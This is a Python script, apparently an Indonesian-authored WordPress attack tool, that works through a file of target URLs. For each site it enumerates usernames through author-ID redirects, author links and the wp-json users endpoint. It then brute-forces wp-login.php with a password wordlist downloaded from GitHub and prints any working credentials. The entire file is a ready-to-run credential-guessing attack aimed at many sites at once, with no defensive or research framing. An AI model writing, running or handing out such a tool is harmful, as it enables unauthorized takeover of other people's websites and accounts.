import requests
from bs4 import BeautifulSoup  # Tambahkan impor ini
from colorama import Fore, Style, init
import time
import re

# Inisialisasi Colorama agar warna bekerja di Windows dan reset otomatis
init(autoreset=True)

# Warna teks
yellow = Fore.YELLOW
red = Fore.RED
green = Fore.GREEN
clear = Style.RESET_ALL

# URL login endpoint WordPress
login_url = "/wp-login.php"
MAX_RETRIES = 3  # Jumlah maksimal percobaan ulang

def check_wp_login(url):
    """Cek apakah WordPress terdeteksi di URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    for attempt in range(MAX_RETRIES):
        try:
            response = requests.get(f"{url}/wp-login.php", timeout=30, allow_redirects=True)
            if response.status_code == 200:
                print(f"{green}[+] WordPress terdeteksi di: {url}{clear}")
                return True
            else:
                print(f"{red}[-] Tidak ada WordPress di: {url} (Status code: {response.status_code})")
                return False
        except requests.exceptions.RequestException as e:
            print(f"{red}[-] Kesalahan saat menghubungkan ke {url}: {str(e)}")
            if attempt < MAX_RETRIES - 1:
                wait_time = 2 ** attempt  # Exponential backoff
                print(f"{yellow}[!] Coba lagi dalam {wait_time} detik...{clear}")
                time.sleep(wait_time)
            else:
                print(f"{red}[-] Gagal menghubungkan setelah {MAX_RETRIES} kali percobaan.{clear}")
                return False

def find_wp_user(url):
    """Fungsi untuk mencari username WordPress dari sebuah URL"""
    if not check_wp_login(url):
        return None

    potential_usernames = []

    # Cek dengan /?author=1
    try:
        response = requests.get(f"{url}/?author=1", timeout=30)
        if response.status_code == 200:
            if 'Location' in response.headers:
                user_slug = response.headers['Location'].split('/author/')[1].split('/')[0]
                potential_usernames.append(user_slug)
                print(f"{green}[+] Username Ditemukan (author): {yellow}{user_slug}{clear} untuk {url}")
            else:
                print(f"{red}[-] Tidak ada redirect untuk /?author=1 di {url}")
    except requests.exceptions.RequestException as e:
        print(f"{red}[-] Kesalahan saat menghubungkan ke {url}: {str(e)}")

    # Cek dengan mengekstrak username dari HTML
    try:
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            for a in soup.find_all('a', href=True):
                if '/author/' in a['href']:
                    user_slug = a['href'].split('/author/')[1].split('/')[0]
                    if user_slug not in potential_usernames:
                        potential_usernames.append(user_slug)
                        print(f"{green}[+] Username Ditemukan (HTML): {yellow}{user_slug}{clear} untuk {url}")
    except requests.exceptions.RequestException as e:
        print(f"{red}[-] Kesalahan saat menghubungkan ke {url}: {str(e)}")

    # Cek dengan wp-json
    try:
        response = requests.get(f"{url}/wp-json/wp/v2/users", timeout=30)
        if response.status_code == 200:
            users = response.json()
            for user in users:
                username = user['slug']
                if username not in potential_usernames:
                    potential_usernames.append(username)
                    print(f"{green}[+] Username Ditemukan (JSON): {yellow}{username}{clear} untuk {url}")
    except requests.exceptions.RequestException as e:
        print(f"{red}[-] Kesalahan saat menghubungkan ke {url}: {str(e)}")

    return potential_usernames if potential_usernames else None

def try_login(url, username, password_list):
    """Fungsi untuk mencoba login ke WordPress dengan username dan daftar password"""
    login_endpoint = f"{url}{login_url}"

    for password in password_list:
        password = password.strip()  # Hapus spasi atau karakter tidak perlu
        if not password:
            continue

        data = {
            'log': username,  # Username
            'pwd': password,  # Password
            'wp-submit': 'Log In',
            'redirect_to': f"{url}/wp-admin/",
            'testcookie': '1'
        }

        try:
            # Mengirim request POST untuk login
            response = requests.post(login_endpoint, data=data, timeout=30)

            # Cek apakah login berhasil (bisa bervariasi, tergantung respon situs)
            if "dashboard" in response.url or "wp-admin" in response.url:
                print(f"{green}[+] Login berhasil!{clear} Username: {username} | Password: {password}")
                return True
            else:
                # Tidak menyimpan kegagalan login di file
                pass

        except requests.RequestException as e:
            print(f"{red}[-] Kesalahan saat mencoba login: {str(e)}")

    return False

def save_result(filename, result):
    """Simpan hasil ke file"""
    with open(filename, 'a') as f:
        f.write(result + "\n")

def fetch_passwords_from_github(github_url):
    """Fungsi untuk mengunduh daftar password dari GitHub"""
    try:
        response = requests.get(github_url, timeout=30)
        response.raise_for_status()  # Periksa apakah request berhasil
        password_list = response.text.splitlines()
        return password_list
    except requests.RequestException as e:
        print(f"{red}[-] Kesalahan saat mengambil password dari GitHub: {str(e)}")
        return []

def fetch_usernames_from_github(github_url):
    """Fungsi untuk mengunduh daftar username dari GitHub"""
    try:
        response = requests.get(github_url, timeout=30)
        response.raise_for_status()  # Periksa apakah request berhasil
        username_list = response.text.splitlines()
        return username_list
    except requests.RequestException as e:
        print(f"{red}[-] Kesalahan saat mengambil username dari GitHub: {str(e)}")
        return []

def process_file(file_name, github_url_password, github_url_username):
    """Membaca file txt untuk URL dan menggunakan daftar password dan username dari GitHub"""
    try:
        # Membaca daftar URL
        with open(file_name, 'r') as file:
            urls = file.readlines()

        # Mengambil daftar password dari GitHub
        password_list = fetch_passwords_from_github(github_url_password)

        # Jika tidak ada password, skip bagian password
        if not password_list:
            print(f"{red}[-] Daftar password tidak dapat diambil dari GitHub, skipping password attempt.")
            password_list = []

        # Mengambil daftar username dari GitHub atau skip jika tidak diisi
        username_list = []
        if github_url_username:
            username_list = fetch_usernames_from_github(github_url_username)

        if not username_list:
            print(f"{yellow}[!] Tidak ada daftar username dari GitHub, menggunakan metode pencarian username WordPress.")

        # Mencoba login untuk setiap URL
        for url in urls:
            url = url.strip()  # Hapus spasi atau karakter tidak perlu
            if url:
                print(f"{yellow}[+] Memproses URL: {url}{clear}")
                potential_usernames = find_wp_user(url)  # Temukan username
                if potential_usernames:
                    for username in potential_usernames:
                        # Mencoba login dengan username yang ditemukan
                        success = try_login(url, username, password_list)
                        if success:
                            break  # Berhenti jika login berhasil
                else:
                    # Jika tidak menemukan username, coba username dari daftar jika ada
                    for username in username_list:
                        print(f"{yellow}[+] Mencoba login dengan username: {username.strip()}{clear}")
                        success = try_login(url, username.strip(), password_list)
                        if success:
                            break  # Berhenti jika login berhasil

    except FileNotFoundError:
        print(f"{red}[-] File tidak ditemukan: {file_name}.{clear}")

if __name__ == '__main__':
    print(yellow + "[=============================]")
    print(yellow + " Pencari Username WordPress & Brute-forcer Login")
    print(yellow + " Versi : 1.2")
    print(yellow + " Dibuat oleh: Fatcat Cyber ft Jack007")
    print(yellow + "[=============================]" + clear)

    # Input nama file dari pengguna
    file_name = input("Masukkan nama file txt yang berisi URL: ")

    # URL file password dari GitHub
    github_url_password = input("Masukkan URL file password dari GitHub: ")

    # URL file username dari GitHub atau skip dengan Enter
    github_url_username = input("Masukkan URL file username dari GitHub (tekan Enter untuk skip): ")

    # Memproses file txt dan mencoba login
    process_file(file_name, github_url_password, github_url_username)
